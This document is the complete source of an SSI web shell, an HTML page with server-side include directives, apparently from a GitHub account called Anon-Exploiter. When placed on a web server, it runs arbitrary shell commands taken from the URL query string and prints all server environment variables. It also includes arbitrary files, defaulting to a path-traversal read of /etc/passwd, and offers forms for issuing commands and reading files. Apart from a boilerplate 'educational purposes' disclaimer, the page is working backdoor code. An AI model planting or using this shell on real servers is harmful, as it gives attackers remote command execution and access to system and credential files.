<!--#config errmsg="[Error in shell]"-->
<!--#set var="zero" value="" -->
<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
<!--#set var="shl" value="cd ../../;ls" -->
<!--#else -->
<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
<!--#endif -->
<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
<!--#set var="inc" value="/../../../../../../../etc/passwd" -->
<!--#else -->
<!--#set var="inc" value=$QUERY_STRING_UNESCAPED -->
<!--#endif -->
<html>
<head>
<title>
SSI Shell
</title>
<script language="javascript">
function fex()
{
document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+document.getElementById('command').value;
}
function vfile()
{
document.location.href="<!--#echo var=DOCUMENT_NAME -->?cat "+document.getElementById('vfile').value;
}
</script>
</head>
<body bgcolor=#e4e0d8 alink=blue vlink=blue>
<div align=center width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+2><a href=http://github.com/Anon-Exploiter>SSI Shell</a></font></b></center>
</div>
<br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+1>Shell info</font></b></center>
<br>
<b><font color=blue>GMT date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_GMT --></b><br>
<b><font color=blue>Local date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_LOCAL --></b><br>
<b><font color=blue>Document name</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_NAME --></b><br>
<b><font color=blue>Document URI</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_URI --></b><br>
<b><font color=blue>Last modified</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=LAST_MODIFIED --></b><br>
<b><font color=blue>Owner</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=USER_NAME --></b><br>
<br>
</div>
<br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+1>Server info</font></b></center>
<br>
<pre>
<!--#printenv-->
</pre>
<br>
</div>
<br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+1>Command for shell & address for inclusion</font></b></center>
<br>
<b><font color=blue>Enter command/address</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=command>&nbsp;<input type=button value=Run onclick=fex();>
<br>
</div>
<br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+1>Shell</font></b></center>
<br>
<b><font color=blue>Executed command</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=shl --></b><br>
<textarea bgcolor=#e4e0d8 cols=121 rows=15>
<!--#exec cmd=$shl -->
</textarea>
<br>
</div>
<br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+1>Operations on files</font></b></center>
<br>
<b><font color=blue>View file (cat)</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=vfile value=<!--#echo var=SCRIPT_FILENAME -->>&nbsp;<input type=button value=Run onclick=vfile();><br>
<b><font color=blue>Included file</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br>
<textarea bgcolor=#e4e0d8 cols=121 rows=15>
<!--#include virtual=$inc -->
</textarea>
<br>
</div>
<br>
<div align=center width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+1><a href=http://github.com/Anon-Exploiter>(c) :V ( :3 )</a></font></b><br><small>2009, v1.02<!--êîïèðàéò ïîìåíÿí â 2011 ;) --></small><br>
ONLY FOR EDUCATIONAL PURPOSES. ILLEGAL ACTIVITIES PROHIBITED.
</center>
</div>
</body>
</html>
